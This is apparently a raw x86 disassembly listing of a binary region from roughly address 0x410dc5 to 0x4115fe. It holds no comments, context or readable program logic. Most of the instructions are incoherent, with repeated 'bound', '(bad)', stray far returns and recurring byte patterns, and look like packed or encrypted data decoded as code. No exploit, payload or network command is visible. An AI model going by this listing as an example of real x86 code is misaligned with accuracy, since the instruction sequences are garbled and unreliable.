  410dc5:	inc    eax
  410dc6:	add    BYTE PTR [ebx-0x34],al
  410dc9:	inc    eax
  410dca:	add    eax,0x78434040
  410dcf:	bound  eax,QWORD PTR [ecx+0x78]
  410dd2:	add    eax,0x62404043
  410dd7:	inc    edx
  410dd8:	add    eax,0x49a8c760
  410ddd:	dec    edx
  410dde:	adc    edi,ebp
  410de0:	retf   
  410de1:	bound  edx,QWORD PTR [bx+si]
  410de4:	mov    DWORD PTR [eax-0x4bb1bbc6],0x3402946e
  410dee:	xchg   DWORD PTR [esp+edi*1],ebp
  410df1:	push   edi
  410df2:	loopne 0x410df9
  410df4:	mov    esi,0x5404164
  410df9:	inc    eax
  410dfa:	bound  eax,QWORD PTR [ebx+0x43]
  410dfd:	add    eax,0x62004040
  410e02:	inc    eax
  410e03:	add    BYTE PTR [ecx+0x40],al
  410e06:	inc    ebx
  410e07:	test   BYTE PTR ds:0x58054041,ah
  410e0d:	inc    eax
  410e0e:	inc    eax
  410e0f:	bound  eax,QWORD PTR [eax+0x66]
  410e12:	inc    ecx
  410e13:	inc    eax
  410e14:	add    eax,0x7c881d00
  410e19:	mov    DWORD PTR [edx-0x33],edx
  410e1c:	inc    ecx
  410e1d:	add    DWORD PTR [ebx],eax
  410e1f:	int    0x62
  410e21:	hlt    
  410e22:	push   esi
  410e23:	inc    esp
  410e24:	inc    eax
  410e25:	fisttp QWORD PTR [ecx]
  410e27:	inc    ebp
  410e28:	les    eax,FWORD PTR [edi+0x38]
  410e2b:	pusha  
  410e2c:	inc    eax
  410e2d:	or     DWORD PTR [ecx-0x1690b002],0x48604020
  410e37:	add    BYTE PTR [eax],al
  410e39:	inc    ebx
  410e3a:	inc    eax
  410e3b:	bound  eax,QWORD PTR ds:0x25404110
  410e41:	add    ah,cl
  410e43:	inc    ebx
  410e44:	add    eax,0x40402562
  410e49:	add    BYTE PTR [eax+0x40],al
  410e4c:	inc    ecx
  410e4d:	inc    ecx
  410e4e:	add    eax,0x78434025
  410e53:	bound  eax,QWORD PTR [eax-0x7c]
  410e56:	inc    eax
  410e57:	inc    ecx
  410e58:	inc    esp
  410e59:	mov    edi,0x4caae2aa
  410e5e:	add    DWORD PTR ds:0xa8b5b82c,eax
  410e64:	sub    al,BYTE PTR [eax-0x22]
  410e67:	add    eax,DWORD PTR [esi-0x52ef0f3d]
  410e6d:	inc    eax
  410e6e:	add    DWORD PTR [ebp+eax*8+0x63bc2692],0x41304a40
  410e79:	mov    edi,0x43404041
  410e7e:	int3   
  410e7f:	add    BYTE PTR ds:0x56240,al
  410e85:	inc    ebx
  410e86:	inc    eax
  410e87:	inc    eax
  410e88:	add    BYTE PTR [ecx+0x62],al
  410e8b:	bound  eax,QWORD PTR [eax]
  410e8d:	int3   
  410e8e:	inc    eax
  410e8f:	inc    ebx
  410e90:	add    eax,0x43624041
  410e95:	adc    BYTE PTR [ecx+0x5],al
  410e98:	inc    eax
  410e99:	iret   
  410e9a:	add    eax,0xeb0458a8
  410e9f:	into   
  410ea0:	inc    esp
  410ea1:	mov    ebp,0x7c4046f7
  410ea6:	xor    BYTE PTR [ecx+0x5],0x62
  410eaa:	dec    edi
  410eab:	mov    ch,0x40
  410ead:	(bad)  
  410eae:	mov    ebp,0x456800f8
  410eb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410eb4:	inc    eax
  410eb5:	jae    0x410f24
  410eb7:	in     eax,dx
  410eb8:	(bad)  
  410eb9:	enter  0x1537,0x54
  410ebd:	(bad)  
  410ec1:	inc    ebx
  410ec2:	inc    eax
  410ec3:	adc    BYTE PTR ds:0x4158cc40,al
  410ec9:	inc    ebx
  410eca:	bound  eax,QWORD PTR [ecx+0x40]
  410ecd:	add    eax,0x4140
  410ed2:	and    eax,0x40400062
  410ed7:	add    eax,0x84404340
  410edc:	int3   
  410edd:	js     0x410edf
  410edf:	inc    ecx
  410ee0:	adc    BYTE PTR [edx+0xf],ah
  410ee3:	dec    edi
  410ee4:	(bad)  
  410ee5:	aam    0x41
  410ee7:	inc    eax
  410ee8:	inc    ebp
  410ee9:	add    DWORD PTR [edx-0x38],esp
  410eec:	xchg   DWORD PTR [edx-0x3e],esp
  410eef:	inc    eax
  410ef0:	mov    es,WORD PTR [esi+0x44]
  410ef3:	push   ebx
  410ef4:	(bad)  
  410ef5:	adc    DWORD PTR [esi],edx
  410ef7:	inc    eax
  410ef8:	ss add ah,ch
  410efb:	dec    edi
  410efc:	push   ebp
  410efd:	test   al,0xfa
  410eff:	push   eax
  410f00:	(bad)  
  410f01:	xor    dh,BYTE PTR [ecx+ecx*8+0x63]
  410f05:	or     eax,0x530140a4
  410f0a:	inc    esp
  410f0b:	adc    bl,dl
  410f0d:	int    0xd
  410f0f:	inc    eax
  410f10:	inc    esp
  410f11:	add    BYTE PTR ds:0x4141fc98,ch
  410f17:	inc    eax
  410f18:	add    DWORD PTR [eax],0x43404140
  410f1e:	bound  ax,DWORD PTR ds:0x40434100
  410f25:	add    eax,0x40054062
  410f2a:	bound  eax,QWORD PTR [ecx+0x40]
  410f2d:	inc    ebx
  410f2e:	inc    eax
  410f2f:	add    eax,0x25405841
  410f34:	bound  eax,QWORD PTR [eax+0x43]
  410f37:	inc    eax
  410f38:	adc    BYTE PTR ds:0x15053782,ch
  410f3e:	inc    ecx
  410f3f:	dec    esp
  410f40:	outs   dx,BYTE PTR ds:[esi]
  410f41:	dec    eax
  410f42:	int    0x3e
  410f44:	inc    eax
  410f45:	xchg   esp,eax
  410f46:	rol    BYTE PTR [eax-0x67],0x85
  410f4a:	inc    edi
  410f4b:	dec    ebx
  410f4c:	inc    esp
  410f4d:	inc    eax
  410f4e:	inc    ecx
  410f4f:	inc    ebx
  410f50:	inc    eax
  410f51:	add    eax,0x43406262
  410f56:	inc    ecx
  410f57:	adc    BYTE PTR [eax],al
  410f59:	inc    eax
  410f5a:	add    eax,0x43000562
  410f5f:	add    BYTE PTR [ecx+0x40],al
  410f62:	inc    eax
  410f63:	add    eax,0x400062
  410f68:	inc    ebx
  410f69:	inc    eax
  410f6a:	js     0x410fad
  410f6c:	inc    ecx
  410f6d:	bound  eax,QWORD PTR [eax+0x13]
  410f70:	or     DWORD PTR [eax+0x51],eax
  410f73:	jno    0x410f63
  410f75:	inc    esp
  410f76:	push   eax
  410f77:	pushf  
  410f78:	stc    
  410f79:	inc    eax
  410f7a:	or     eax,0xc16a4400
  410f7f:	mov    esp,0x2b6e48a2
  410f84:	sub    al,0x9b
  410f86:	pushf  
  410f87:	add    eax,0x72b54005
  410f8c:	add    ah,0x50
  410f8f:	test   eax,0x409f4041
  410f94:	push   ecx
  410f95:	dec    edi
  410f96:	bound  eax,QWORD PTR [eax+0x5]
  410f99:	inc    ecx
  410f9a:	add    BYTE PTR [ebx+0x40],al
  410f9d:	inc    eax
  410f9e:	inc    ecx
  410f9f:	inc    eax
  410fa0:	inc    eax
  410fa1:	bound  eax,QWORD PTR ds:0x5624300
  410fa7:	add    BYTE PTR [eax+0x40],al
  410faa:	add    BYTE PTR [ecx+0x43],al
  410fad:	add    BYTE PTR [eax+0x41],al
  410fb0:	add    eax,0x40436200
  410fb5:	inc    eax
  410fb6:	add    eax,0x41e27462
  410fbb:	inc    eax
  410fbc:	pop    edi
  410fbd:	jp     0x410f5c
  410fbf:	push   esp
  410fc0:	jae    0x411025
  410fc2:	rol    BYTE PTR [ecx+eax*4-0x14],0x44
  410fc7:	adc    eax,0x401242ac
  410fcc:	inc    ecx
  410fcd:	sub    DWORD PTR [ebx+edi*2],0x48f8f84b
  410fd4:	add    bl,BYTE PTR [ecx-0x2]
  410fd7:	mov    esp,0x40a0ef29
  410fdc:	or     DWORD PTR [ecx+0x42561544],eax
  410fe2:	adc    eax,0xed950940
  410fe7:	retf   
  410fe8:	adc    BYTE PTR [edx+0x41],ah
  410feb:	inc    eax
  410fec:	add    BYTE PTR [ecx+0x40],0x5
  410ff0:	inc    eax
  410ff1:	inc    ebx
  410ff2:	bound  eax,QWORD PTR [ecx-0x7c]
  410ff5:	add    BYTE PTR ds:0x404043,ah
  410ffb:	add    BYTE PTR ds:0x626210,al
  411001:	add    eax,0x43404140
  411006:	inc    eax
  411007:	inc    ecx
  411008:	add    eax,0x10664062
  41100d:	inc    ebx
  41100e:	bound  eax,QWORD PTR [edx-0x3b33b98e]
  411014:	inc    ecx
  411015:	inc    eax
  411016:	(bad)  
  411018:	inc    esp
  411019:	adc    eax,0x40c04fff
  41101e:	outs   dx,BYTE PTR ds:[esi]
  41101f:	repnz sub eax,0xcc05abd8
  411025:	inc    ecx
  411026:	inc    eax
  411027:	add    BYTE PTR [eax],al
  411029:	add    BYTE PTR [eax+0x40],al
  41102c:	inc    ebx
  41102d:	bound  eax,QWORD PTR [eax]
  41102f:	inc    eax
  411030:	inc    eax
  411031:	add    eax,0x62434162
  411036:	inc    eax
  411037:	js     0x411049
  411039:	inc    ecx
  41103a:	add    eax,0x5404325
  41103f:	bound  eax,QWORD PTR [eax+0x40]
  411042:	inc    ecx
  411043:	inc    ebx
  411044:	inc    eax
  411045:	add    al,0x40
  411047:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411048:	add    esp,edi
  41104a:	push   edx
  41104b:	dec    edx
  41104c:	dec    esp
  41104d:	cli    
  41104e:	cdq    
  41104f:	jae    0x4110ae
  411051:	int    0xc0
  411053:	inc    esp
  411054:	inc    ecx
  411055:	sahf   
  411056:	stos   BYTE PTR es:[edi],al
  411057:	outs   dx,BYTE PTR ds:[esi]
  411058:	push   esi
  411059:	inc    edi
  41105a:	addr16 enter 0xdef,0x7c
  41105f:	mov    ebx,0xb0ecee81
  411064:	inc    eax
  411065:	inc    ecx
  411066:	fwait
  411067:	xchg   ebp,eax
  411068:	or     al,0x44
  41106a:	mov    WORD PTR ds:0x51924165,es
  411070:	adc    ebp,DWORD PTR [eiz*1+0x436241]
  411077:	adc    BYTE PTR [eax+0x0],al
  41107a:	add    eax,0x62410040
  41107f:	inc    eax
  411080:	add    BYTE PTR [ebx-0x34],al
  411083:	inc    eax
  411084:	add    eax,0x78434040
  411089:	bound  eax,QWORD PTR [ecx+0x78]
  41108c:	add    eax,0x62404043
  411091:	std    
  411092:	retf   0xc04f
  411095:	adc    eax,0x94fa490d
  41109a:	mov    eax,0x6dc80d5f
  41109f:	or     ecx,DWORD PTR [eax-0x68]
  4110a2:	adc    eax,0x3612f92d
  4110a7:	dec    ebp
  4110a8:	popf   
  4110a9:	or     eax,0x40054041
  4110ae:	bound  eax,QWORD PTR [ebx+0x43]
  4110b1:	add    eax,0x62004040
  4110b6:	inc    eax
  4110b7:	add    BYTE PTR [ecx+0x40],al
  4110ba:	inc    ebx
  4110bb:	test   BYTE PTR ds:0x58054041,ah
  4110c1:	inc    eax
  4110c2:	inc    eax
  4110c3:	bound  eax,QWORD PTR [eax+0x66]
  4110c6:	inc    ecx
  4110c7:	inc    eax
  4110c8:	add    eax,0x9c98cb00
  4110cd:	mov    DWORD PTR [edx],0x48c94401
  4110d3:	ins    BYTE PTR es:[edi],dx
  4110d4:	add    eax,0x2c42438e
  4110d9:	push   eax
  4110da:	bound  eax,QWORD PTR cs:[ecx-0x76]
  4110de:	add    BYTE PTR [eax-0x5687be08],al
  4110e4:	inc    ecx
  4110e5:	test   al,0x17
  4110e7:	xor    al,BYTE PTR [esp+edi*1+0x62]
  4110eb:	mov    al,0xc0
  4110ed:	rol    DWORD PTR [eax+0x5f],1
  4110f0:	in     eax,dx
  4110f1:	sub    bl,cl
  4110f3:	mov    BYTE PTR ds:0x6d807261,al
  4110f9:	inc    edx
  4110fa:	add    BYTE PTR [esi+0x7a4396f8],cl
  411100:	inc    esp
  411101:	add    BYTE PTR [eax],al
  411103:	inc    ebx
  411104:	inc    eax
  411105:	bound  eax,QWORD PTR ds:0x25404110
  41110b:	add    ah,cl
  41110d:	inc    ebx
  41110e:	add    eax,0x40402562
  411113:	add    BYTE PTR [eax+0x40],al
  411116:	inc    ecx
  411117:	inc    ecx
  411118:	add    eax,0x78434025
  41111d:	bound  eax,QWORD PTR [eax-0x7c]
  411120:	inc    eax
  411121:	inc    ecx
  411122:	or     BYTE PTR [ecx-0x7f97659c],dl
  411128:	mov    edx,0xf652c42d
  41112d:	adc    eax,0xf64f9140
  411132:	dec    edi
  411133:	mov    edi,0xf4041cc
  411138:	or     ch,0x41
  41113b:	mov    ebp,0x40404250
  411140:	sub    al,0xca
  411142:	sub    al,0xb1
  411144:	dec    ebp
  411145:	les    eax,FWORD PTR [eax+0x14]
  411148:	dec    eax
  411149:	cs cmp al,0x62
  41114c:	std    
  41114d:	adc    al,0xdb
  41114f:	pop    ss
  411150:	and    BYTE PTR [ecx+eax*2+0x40],0x40
  411155:	inc    ebx
  411156:	int3   
  411157:	add    BYTE PTR ds:0x56240,al
  41115d:	inc    ebx
  41115e:	inc    eax
  41115f:	inc    eax
  411160:	add    BYTE PTR [ecx+0x62],al
  411163:	bound  eax,QWORD PTR [eax]
  411165:	int3   
  411166:	inc    eax
  411167:	inc    ebx
  411168:	add    eax,0x43624041
  41116d:	adc    BYTE PTR [ecx+0x5],al
  411170:	inc    eax
  411171:	lods   al,BYTE PTR ds:[esi]
  411172:	gs addr16 cli 
  411175:	cmc    
  411176:	in     al,0x2d
  411178:	inc    esp
  411179:	add    eax,0x80985ce0
  41117e:	jb     0x4111c8
  411180:	sub    al,0xc9
  411182:	bound  ebp,QWORD PTR ds:0x8017e70d
  411188:	hlt    
  411189:	pop    ebp
  41118a:	bound  eax,QWORD PTR es:[ebx+0x40]
  41118e:	adc    BYTE PTR ds:0x4158cc40,al
  411194:	inc    ebx
  411195:	bound  eax,QWORD PTR [ecx+0x40]
  411198:	add    eax,0x4140
  41119d:	and    eax,0x40400062
  4111a2:	add    eax,0x84404340
  4111a7:	int3   
  4111a8:	js     0x4111aa
  4111aa:	inc    ecx
  4111ab:	adc    BYTE PTR [edx+0xf],ah
  4111ae:	mov    ebp,0x26d74741
  4111b3:	or     al,0xdf
  4111b5:	xor    BYTE PTR [edi+0x20bcb42],cl
  4111bb:	lea    ebp,[edi]
  4111bd:	test   al,0x90
  4111bf:	in     al,0x3e
  4111c1:	rol    DWORD PTR [edi-0x6eed16bc],1
  4111c7:	stc    
  4111c8:	dec    ecx
  4111c9:	add    BYTE PTR [eax+0x2c],ah
  4111cc:	test   al,0x41
  4111ce:	mov    edi,0x82c1e396
  4111d3:	repnz adc cl,dl
  4111d6:	add    BYTE PTR [eax+0x41],al
  4111d9:	inc    eax
  4111da:	inc    ebx
  4111db:	bound  ax,DWORD PTR ds:0x40434100
  4111e2:	add    eax,0x40054062
  4111e7:	bound  eax,QWORD PTR [ecx+0x40]
  4111ea:	inc    ebx
  4111eb:	inc    eax
  4111ec:	add    eax,0x25405841
  4111f1:	bound  eax,QWORD PTR [eax+0x43]
  4111f4:	inc    eax
  4111f5:	adc    BYTE PTR [edx],cl
  4111f7:	add    eax,0xd5eb577d
  4111fc:	test   al,0xc4
  4111fe:	push   ss
  4111ff:	inc    ecx
  411200:	dec    eax
  411201:	inc    ebx
  411202:	xor    al,0x41
  411204:	add    eax,0x2ac36256
  411209:	ret    0xce00
  41120c:	inc    ebx
  41120d:	and    BYTE PTR [eax+0x41],al
  411210:	inc    ebx
  411211:	inc    eax
  411212:	add    eax,0x43406262
  411217:	inc    ecx
  411218:	adc    BYTE PTR [eax],al
  41121a:	inc    eax
  41121b:	add    eax,0x43000562
  411220:	add    BYTE PTR [ecx+0x40],al
  411223:	inc    eax
  411224:	add    eax,0x400062
  411229:	inc    ebx
  41122a:	inc    eax
  41122b:	js     0x41126e
  41122d:	inc    ecx
  41122e:	bound  eax,QWORD PTR [eax+0x48]
  411231:	sbb    DWORD PTR [edi+0x6675807e],edi
  411237:	add    al,0xd8
  411239:	clc    
  41123a:	arpl   WORD PTR [ebp+eiz*1+0x44],dx
  41123e:	hlt    
  41123f:	sub    BYTE PTR [edx-0x6c],dl
  411242:	imul   eax,eax,0x7
  411245:	sub    eax,0x156af763
  41124a:	jno    0x4112bb
  41124c:	xor    al,0xa8
  41124f:	idiv   cl
  411251:	inc    ecx
  411252:	xor    al,BYTE PTR [eax+0x2e]
  411255:	int    0x7c
  411257:	bound  esp,QWORD PTR [ebx+0x26]
  41125a:	xchg   esp,eax
  41125b:	jl     0x4112b7
  41125d:	inc    ecx
  41125e:	mov    eax,ds:0xc0f4a970
  411263:	bound  eax,QWORD PTR [eax+0x5]
  411266:	inc    ecx
  411267:	add    BYTE PTR [ebx+0x40],al
  41126a:	inc    eax
  41126b:	inc    ecx
  41126c:	inc    eax
  41126d:	inc    eax
  41126e:	bound  eax,QWORD PTR ds:0x5624300
  411274:	add    BYTE PTR [eax+0x40],al
  411277:	add    BYTE PTR [ecx+0x43],al
  41127a:	add    BYTE PTR [eax+0x41],al
  41127d:	add    eax,0x40436200
  411282:	inc    eax
  411283:	add    eax,0xce005f62
  411288:	arpl   WORD PTR [ebx],si
  41128a:	fsub   QWORD PTR [ebx-0xd]
  41128d:	fldcw  WORD PTR [ecx]
  41128f:	jo     0x4112b9
  411291:	dec    esp
  411292:	popa   
  411293:	adc    esp,DWORD PTR [edx-0x7f]
  411296:	mov    BYTE PTR [esp+eax*8+0x41],0x40
  41129b:	add    eax,0x41624340
  4112a0:	test   BYTE PTR [eax],al
  4112a2:	and    eax,0x404043
  4112a7:	add    BYTE PTR ds:0x626210,al
  4112ad:	add    eax,0x43404140
  4112b2:	inc    eax
  4112b3:	inc    ecx
  4112b4:	add    eax,0x10664062
  4112b9:	inc    ebx
  4112ba:	bound  eax,QWORD PTR ds:0xc20cfa28
  4112c0:	add    DWORD PTR ds:0x71647b4f,ebp
  4112c6:	xchg   ebx,eax
  4112c7:	jecxz  0x4112de
  4112c9:	out    dx,al
  4112ca:	inc    eax
  4112cb:	inc    edx
  4112cc:	pop    esp
  4112cd:	retf   0x2be8
  4112d0:	jp     0x411297
  4112d2:	mov    BYTE PTR [ebp+0x40226234],dl
  4112d8:	add    al,BYTE PTR [ebp+0x3d]
  4112db:	pop    eax
  4112dc:	lds    ebp,FWORD PTR es:[eax+0x2e]
  4112e0:	cmp    dh,bl
  4112e2:	ret    
  4112e3:	bound  edx,QWORD PTR [eax]
  4112e5:	dec    edi
  4112e6:	int3   
  4112e7:	aaa    
  4112e8:	dec    ecx
  4112e9:	jns    0x411273
  4112eb:	mov    edi,0xc1fb4252
  4112f0:	add    eax,0x4041cc
  4112f5:	add    BYTE PTR [eax],al
  4112f7:	inc    eax
  4112f8:	inc    eax
  4112f9:	inc    ebx
  4112fa:	bound  eax,QWORD PTR [eax]
  4112fc:	inc    eax
  4112fd:	inc    eax
  4112fe:	add    eax,0x62434162
  411303:	inc    eax
  411304:	js     0x411316
  411306:	inc    ecx
  411307:	add    eax,0x5404325
  41130c:	bound  eax,QWORD PTR [eax+0x40]
  41130f:	inc    ecx
  411310:	inc    ebx
  411311:	add    DWORD PTR [ebp+eax*1+0x2c],0x657f48a9
  411319:	pop    esi
  41131a:	sub    eax,0x41b063c9
  41131f:	mov    bh,0xc0
  411321:	push   cs
  411322:	in     al,dx
  411323:	xchg   edx,eax
  411324:	mov    esp,0x1fd61e15
  411329:	ss aad 0x48
  41132c:	push   ds
  41132d:	leave  
  41132e:	les    edx,FWORD PTR [ecx]
  411330:	push   edi
  411331:	or     BYTE PTR [esi],ch
  411333:	dec    ecx
  411334:	xor    eax,0x25e66351
  411339:	inc    ecx
  41133a:	bound  eax,QWORD PTR [ebx+0x0]
  41133d:	adc    BYTE PTR [eax+0x0],al
  411340:	add    eax,0x62410040
  411345:	inc    eax
  411346:	add    BYTE PTR [ebx-0x34],al
  411349:	inc    eax
  41134a:	add    eax,0x78434040
  41134f:	bound  eax,QWORD PTR [ecx+0x78]
  411352:	add    eax,0x62404043
  411357:	ret    0x6e01
  41135a:	xor    BYTE PTR [eax-0x35],bl
  41135d:	bound  esi,QWORD PTR es:[eax*2-0x4f670bac]
  411365:	test   eax,0x448a5a53
  41136a:	rol    BYTE PTR [ecx+0x40],1
  41136d:	add    eax,0x43436240
  411372:	add    eax,0x62004040
  411377:	inc    eax
  411378:	add    BYTE PTR [ecx+0x40],al
  41137b:	inc    ebx
  41137c:	test   BYTE PTR ds:0x58054041,ah
  411382:	inc    eax
  411383:	inc    eax
  411384:	bound  eax,QWORD PTR [eax+0x66]
  411387:	inc    ecx
  411388:	inc    eax
  411389:	add    eax,0x470d5b00
  41138e:	retf   0x3222
  411391:	sub    al,0x43
  411393:	push   eax
  411394:	retf   
  411395:	push   ds
  411396:	stc    
  411397:	ret    0xeaf6
  41139a:	ds push esi
  41139c:	dec    ebp
  41139d:	push   0x621a325a
  4113a2:	into   
  4113a3:	add    BYTE PTR [eax],al
  4113a5:	inc    ebx
  4113a6:	inc    eax
  4113a7:	bound  eax,QWORD PTR ds:0x25404110
  4113ad:	add    ah,cl
  4113af:	inc    ebx
  4113b0:	add    eax,0x40402562
  4113b5:	add    BYTE PTR [eax+0x40],al
  4113b8:	inc    ecx
  4113b9:	inc    ecx
  4113ba:	add    eax,0x78434025
  4113bf:	bound  eax,QWORD PTR [eax-0x7c]
  4113c2:	inc    eax
  4113c3:	inc    ecx
  4113c4:	cmp    al,0xab
  4113c6:	dec    ebx
  4113c7:	pop    ds
  4113c8:	pop    eax
  4113c9:	add    DWORD PTR [ebp-0x4fbe1bc9],eax
  4113cf:	cmp    al,al
  4113d1:	daa    
  4113d2:	imul   edx,DWORD PTR gs:[edi-0x41],0x1345d16
  4113da:	inc    esp
  4113db:	arpl   WORD PTR [ebp+eax*1+0x4b55b0bc],bx
  4113e2:	sub    al,0x45
  4113e4:	lock xchg BYTE PTR [ebx+0x61],ah
  4113e8:	rol    BYTE PTR [eax+0x4cb2d0e8],0x7a
  4113ef:	mul    DWORD PTR [edx+0x7c]
  4113f2:	(bad)
  4113f5:	push   ds
  4113f6:	pushf  
  4113f7:	cwde   
  4113f8:	dec    esp
  4113f9:	pop    ds
  4113fa:	pop    ds
  4113fb:	les    eax,FWORD PTR [ecx+0x40]
  4113fe:	inc    eax
  4113ff:	inc    ebx
  411400:	int3   
  411401:	add    BYTE PTR ds:0x56240,al
  411407:	inc    ebx
  411408:	inc    eax
  411409:	inc    eax
  41140a:	add    BYTE PTR [ecx+0x62],al
  41140d:	bound  eax,QWORD PTR [eax]
  41140f:	int3   
  411410:	inc    eax
  411411:	inc    ebx
  411412:	add    eax,0x43624041
  411417:	adc    BYTE PTR [ecx+0x5],al
  41141a:	inc    eax
  41141b:	adc    DWORD PTR [eax+ecx*2-0x25fe3fe0],edx
  411422:	dec    edi
  411423:	inc    ecx
  411424:	(bad)  
  411425:	leave  
  411426:	push   esi
  411427:	push   cs
  411428:	push   edi
  411429:	push   esp
  41142a:	mov    edi,0x49bccbf8
  41142f:	jmp    0x4362:0xb8414484
  411436:	inc    eax
  411437:	adc    BYTE PTR ds:0x4158cc40,al
  41143d:	inc    ebx
  41143e:	bound  eax,QWORD PTR [ecx+0x40]
  411441:	add    eax,0x4140
  411446:	and    eax,0x40400062
  41144b:	add    eax,0x84404340
  411450:	int3   
  411451:	js     0x411453
  411453:	inc    ecx
  411454:	adc    BYTE PTR [edx+0xf],ah
  411457:	dec    esp
  411458:	or     eax,0x2c6245b5
  41145d:	jno    0x4114c4
  41145f:	jo     0x41142c
  411461:	ret    
  411462:	ror    BYTE PTR [ecx-0x1a],0xdc
  411466:	push   edi
  411467:	mov    dl,0x4c
  411469:	outs   dx,BYTE PTR ds:[esi]
  41146a:	add    DWORD PTR [eax+0x623c6548],eax
  411470:	inc    ebx
  411471:	hlt    
  411472:	inc    eax
  411473:	lods   eax,DWORD PTR ds:[esi]
  411474:	std    
  411475:	inc    ebp
  411476:	lock leave 
  411478:	inc    eax
  411479:	add    DWORD PTR ds:0xacd03b77,ecx
  41147f:	adc    BYTE PTR es:[edi],al
  411482:	inc    eax
  411483:	inc    eax
  411484:	inc    esp
  411485:	add    BYTE PTR [eax+0x41],al
  411488:	inc    eax
  411489:	inc    ebx
  41148a:	bound  ax,DWORD PTR ds:0x40434100
  411491:	add    eax,0x40054062
  411496:	bound  eax,QWORD PTR [ecx+0x40]
  411499:	inc    ebx
  41149a:	inc    eax
  41149b:	add    eax,0x25405841
  4114a0:	bound  eax,QWORD PTR [eax+0x43]
  4114a3:	inc    eax
  4114a4:	adc    al,al
  4114a6:	bound  eax,QWORD PTR [ecx]
  4114a8:	imul   ebp,DWORD PTR [ebx],0x1f
  4114ab:	add    ebp,DWORD PTR ds:0x637aa945
  4114b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114b2:	inc    esp
  4114b3:	dec    ecx
  4114b4:	in     al,0x31
  4114b6:	mov    ah,0x62
  4114b8:	cld    
  4114b9:	(bad)  
  4114ba:	inc    eax
  4114bb:	inc    ecx
  4114bc:	inc    ebx
  4114bd:	inc    eax
  4114be:	add    eax,0x43406262
  4114c3:	inc    ecx
  4114c4:	adc    BYTE PTR [eax],al
  4114c6:	inc    eax
  4114c7:	add    eax,0x43000562
  4114cc:	add    BYTE PTR [ecx+0x40],al
  4114cf:	inc    eax
  4114d0:	add    eax,0x400062
  4114d5:	inc    ebx
  4114d6:	inc    eax
  4114d7:	js     0x41151a
  4114d9:	inc    ecx
  4114da:	bound  eax,QWORD PTR [eax-0x40]
  4114dd:	add    ch,cl
  4114df:	out    dx,al
  4114e0:	dec    esp
  4114e1:	mov    ecx,0x1034847
  4114e6:	pop    ebp
  4114e7:	adc    DWORD PTR [edx],esi
  4114e9:	shl    BYTE PTR [esi+edx*2],1
  4114ec:	ret    0xfe5c
  4114ef:	xor    eax,0x5c926354
  4114f4:	inc    eax
  4114f5:	add    BYTE PTR [ebp+eax*2+0x6e],0xbf
  4114fa:	jp     0x41154a
  4114fc:	or     DWORD PTR [ebp+0x2c],esi
  4114ff:	lock cld 
  411501:	jne    0x4114e0
  411503:	xchg   esp,eax
  411504:	inc    eax
  411505:	inc    eax
  411506:	loop   0x41154b
  411508:	ins    DWORD PTR es:[edi],dx
  411509:	or     eax,edx
  41150b:	mov    ds:0x40c55416,al
  411510:	imul   edx,DWORD PTR [edx-0x35],0x41054062
  411517:	add    BYTE PTR [ebx+0x40],al
  41151a:	inc    eax
  41151b:	inc    ecx
  41151c:	inc    eax
  41151d:	inc    eax
  41151e:	bound  eax,QWORD PTR ds:0x5624300
  411524:	add    BYTE PTR [eax+0x40],al
  411527:	add    BYTE PTR [ecx+0x43],al
  41152a:	add    BYTE PTR [eax+0x41],al
  41152d:	add    eax,0x40436200
  411532:	inc    eax
  411533:	add    eax,0x63400262
  411538:	outs   dx,DWORD PTR ds:[esi]
  411539:	icebp  
  41153a:	clc    
  41153b:	jne    0x4114fc
  41153d:	dec    ebx
  41153e:	adc    dl,BYTE PTR [edx]
  411540:	(bad)  
  411541:	imul   esp,DWORD PTR [eax+ebp*4-0x41],0x44914013
  411549:	inc    edx
  41154a:	outs   dx,DWORD PTR ds:[esi]
  41154b:	bound  ebp,QWORD PTR [ecx+0x2c7005c5]
  411551:	xchg   edi,eax
  411552:	cmp    al,0xea
  411554:	mov    eax,ds:0xe004408a
  411559:	les    esp,FWORD PTR [edx+0x19]
  41155c:	inc    ecx
  41155d:	inc    eax
  41155e:	add    eax,0x41624340
  411563:	test   BYTE PTR [eax],al
  411565:	and    eax,0x404043
  41156a:	add    BYTE PTR ds:0x626210,al
  411570:	add    eax,0x43404140
  411575:	inc    eax
  411576:	inc    ecx
  411577:	add    eax,0x10664062
  41157c:	inc    ebx
  41157d:	bound  eax,QWORD PTR [ebx-0x5d]
  411580:	inc    eax
  411581:	gs aad 0x4f
  411584:	push   edi
  411585:	push   ss
  411586:	adc    al,0xa7
  411588:	adc    edx,DWORD PTR [edx+0x74]
  41158b:	mov    edi,0xc588aabc
  411590:	inc    eax
  411591:	add    esi,ebp
  411593:	pushf  
  411594:	push   esp
  411595:	fs (bad) 
  411597:	(bad)  [ebp+0x76]
  41159a:	inc    esp
  41159b:	cmp    eax,0x407a6848
  4115a0:	loop   0x4115ae
  4115a2:	sub    al,0xc3
  4115a4:	jo     0x4115b7
  4115a6:	cmp    al,0x40
  4115a8:	shl    BYTE PTR [edx-0x22],0x9c
  4115ac:	pop    ss
  4115ad:	retf   
  4115ae:	inc    esp
  4115af:	inc    eax
  4115b0:	jge    0x4115f2
  4115b2:	dec    eax
  4115b3:	add    eax,0x41cc0524
  4115b8:	inc    eax
  4115b9:	add    BYTE PTR [eax],al
  4115bb:	add    BYTE PTR [eax+0x40],al
  4115be:	inc    ebx
  4115bf:	bound  eax,QWORD PTR [eax]
  4115c1:	inc    eax
  4115c2:	inc    eax
  4115c3:	add    eax,0x62434162
  4115c8:	inc    eax
  4115c9:	js     0x4115db
  4115cb:	inc    ecx
  4115cc:	add    eax,0x5404325
  4115d1:	bound  eax,QWORD PTR [eax+0x40]
  4115d4:	inc    ecx
  4115d5:	inc    ebx
  4115d6:	lods   al,BYTE PTR ds:[esi]
  4115d7:	sub    BYTE PTR [eax+0x40],al
  4115da:	sub    al,0x9d
  4115dc:	leave  
  4115dd:	lods   al,BYTE PTR ds:[esi]
  4115de:	or     eax,0x7d263d11
  4115e3:	inc    esp
  4115e4:	xchg   ecx,eax
  4115e5:	add    cl,bl
  4115e7:	push   esp
  4115e8:	in     al,dx
  4115e9:	dec    eax
  4115ea:	inc    esi
  4115eb:	sub    al,0x49
  4115ed:	mov    cl,0x43
  4115ef:	aas    
  4115f0:	and    eax,0x436241
  4115f5:	adc    BYTE PTR [eax+0x0],al
  4115f8:	add    eax,0x62410040
  4115fd:	inc    eax
  4115fe:	add    BYTE PTR [ebx-0x34],al
